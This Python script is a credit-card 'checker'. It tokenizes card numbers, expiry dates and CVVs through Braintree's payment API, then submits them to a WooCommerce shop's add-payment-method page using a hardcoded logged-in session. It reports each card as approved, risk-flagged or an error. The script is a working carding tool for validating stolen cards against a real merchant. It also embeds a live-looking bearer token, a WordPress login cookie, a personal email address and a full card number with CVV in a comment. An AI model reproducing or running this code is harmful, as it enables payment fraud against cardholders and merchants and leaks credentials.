def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	




































	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjI0Njc2NzcsImp0aSI6IjA5NjEzNGZmLWIzZWYtNGU5NS1hMjZiLTcwYTY5Y2U4ZTY2MiIsInN1YiI6InhyYzZyeTlua3Z4cms2cnIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InhyYzZyeTlua3Z4cms2cnIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.kY0GNXfgU2pyewXVkFCmqOeZ6xH_DtHSx6Btk-3m1-_1lM4_OUKEBGpw870xiSpEv-5-P4OkCp70nnrKWqa7ZA',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '196952c6-6a35-4244-8c81-60e734b76bfb',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"196952c6-6a35-4244-8c81-60e734b76bfb"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5111970553736819","expirationMonth":"10","expirationYear":"2027","cvv":"034"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	tok = response.json()['data']['tokenizeCreditCard']['token']

#





	cookies = {
    'apbct_site_landing_ts': '1722381097',
    'apbct_site_referer': 'UNKNOWN',
    'ct_sfw_pass_key': 'fe603805217add28e88ef94244e97e5d0',
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.agedcork.com%2Fmy-account%2Fadd-payment-method%2F',
    '_ga': 'GA1.1.1348021723.1722381101',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-30%2023%3A11%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.agedcork.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-07-30%2023%3A11%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.agedcork.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'ct_timezone': '3',
    'apbct_headless': 'false',
    'ct_checkjs': '1fb76414a198a3507e6f66522b04842c254bb71babd8b567e244a9ebbf6e90a7',
    'ct_has_scrolled': 'true',
    'ct_mouse_moved': 'true',
    'ct_has_input_focused': 'true',
    'ct_has_key_up': 'true',
    'mailchimp.cart.current_email': 'moh5527vbnm@gmail.com',
    'mailchimp.cart.previous_email': 'moh5527vbnm@gmail.com',
    'apbct_pixel_url': 'https%3A%2F%2Fmoderate9-v4.cleantalk.org%2Fpixel%2Fca64a35696e3e4656ae3270e6912c646.gif',
    'mailchimp_user_email': 'moh5527vbnm%40gmail.com',
    'wordpress_logged_in_f83b8b4ce4179240b65c0fbccb107f64': 'moh5527vbnm%7C1723590734%7Cq9KpEAG2oSFAb6glMhzanY3vNfzXxTZIOafqI1Yt8SL%7C064a3768af3329821c60d2bf46e3ae561c70dacf9a7da12b6c9eb599e5b921a0',
    'wpx_logged': '1',
    'spbc_is_logged_in': '390f2a8ea0cb5677600c0199dcf2a468',
    'ct_checked_emails': '0',
    '_ga_4RCEK1T6C7': 'GS1.1.1722381100.1.1.1722381270.0.0.0',
    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.agedcork.com%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_BK8EY0S2LE': 'GS1.1.1722381104.1.1.1722381273.0.0.0',
    'ct_ps_timestamp': '1722381273',
    'ct_screen_info': '%7B%22fullWidth%22%3A393%2C%22fullHeight%22%3A1120%2C%22visibleWidth%22%3A393%2C%22visibleHeight%22%3A801%7D',
    '_ga_R73M7V9BRP': 'GS1.1.1722381104.1.1.1722381275.0.0.0',
    'apbct_timestamp': '1722381277',
    'apbct_prev_referer': 'https%3A%2F%2Fwww.agedcork.com%2Fmy-account%2Fadd-payment-method%2F',
    'apbct_page_hits': '15',
    'apbct_cookies_test': '%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_prev_referer%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%252271ced899b9b8dc121d8d3abd6ffd436f%2522%257D',
    'ct_fkp_timestamp': '1722381319',
    'ct_pointer_data': '%5B%5B513%2C252%2C46256%5D%5D',
}

	headers = {
    'authority': 'www.agedcork.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'apbct_site_landing_ts=1722381097; apbct_site_referer=UNKNOWN; ct_sfw_pass_key=fe603805217add28e88ef94244e97e5d0; mailchimp_landing_site=https%3A%2F%2Fwww.agedcork.com%2Fmy-account%2Fadd-payment-method%2F; _ga=GA1.1.1348021723.1722381101; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-30%2023%3A11%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.agedcork.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-30%2023%3A11%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.agedcork.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; ct_timezone=3; apbct_headless=false; ct_checkjs=1fb76414a198a3507e6f66522b04842c254bb71babd8b567e244a9ebbf6e90a7; ct_has_scrolled=true; ct_mouse_moved=true; ct_has_input_focused=true; ct_has_key_up=true; mailchimp.cart.current_email=moh5527vbnm@gmail.com; mailchimp.cart.previous_email=moh5527vbnm@gmail.com; apbct_pixel_url=https%3A%2F%2Fmoderate9-v4.cleantalk.org%2Fpixel%2Fca64a35696e3e4656ae3270e6912c646.gif; mailchimp_user_email=moh5527vbnm%40gmail.com; wordpress_logged_in_f83b8b4ce4179240b65c0fbccb107f64=moh5527vbnm%7C1723590734%7Cq9KpEAG2oSFAb6glMhzanY3vNfzXxTZIOafqI1Yt8SL%7C064a3768af3329821c60d2bf46e3ae561c70dacf9a7da12b6c9eb599e5b921a0; wpx_logged=1; spbc_is_logged_in=390f2a8ea0cb5677600c0199dcf2a468; ct_checked_emails=0; _ga_4RCEK1T6C7=GS1.1.1722381100.1.1.1722381270.0.0.0; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.agedcork.com%2Fmy-account%2Fadd-payment-method%2F; _ga_BK8EY0S2LE=GS1.1.1722381104.1.1.1722381273.0.0.0; ct_ps_timestamp=1722381273; ct_screen_info=%7B%22fullWidth%22%3A393%2C%22fullHeight%22%3A1120%2C%22visibleWidth%22%3A393%2C%22visibleHeight%22%3A801%7D; _ga_R73M7V9BRP=GS1.1.1722381104.1.1.1722381275.0.0.0; apbct_timestamp=1722381277; apbct_prev_referer=https%3A%2F%2Fwww.agedcork.com%2Fmy-account%2Fadd-payment-method%2F; apbct_page_hits=15; apbct_cookies_test=%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_prev_referer%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%252271ced899b9b8dc121d8d3abd6ffd436f%2522%257D; ct_fkp_timestamp=1722381319; ct_pointer_data=%5B%5B513%2C252%2C46256%5D%5D',
    'origin': 'https://www.agedcork.com',
    'pragma': 'no-cache',
    'referer': 'https://www.agedcork.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '{"correlation_id":"713acd6270ed5f9d034a65495a32e3a2"}',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': 'cb6c0b938b',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
    'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJ3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtY2FyZC10eXBlIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtZW5hYmxlZCB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtM2Qtc2VjdXJlLXZlcmlmaWVkIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtb3JkZXItdG90YWwgd2NfYnJhaW50cmVlX2NyZWRpdF9jYXJkX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC10b2tlbml6ZS1wYXltZW50LW1ldGhvZCB3b29jb21tZXJjZS1hZGQtcGF5bWVudC1tZXRob2Qtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciB3b29jb21tZXJjZV9hZGRfcGF5bWVudF9tZXRob2QiLCJpbnZpc2libGVfZmllbGRzX2NvdW50IjoxMH19',
}

	response = requests.post('https://www.agedcork.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)

	text = response.text
	
	pattern = r'Status code (.*?)\s*</li>'
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	
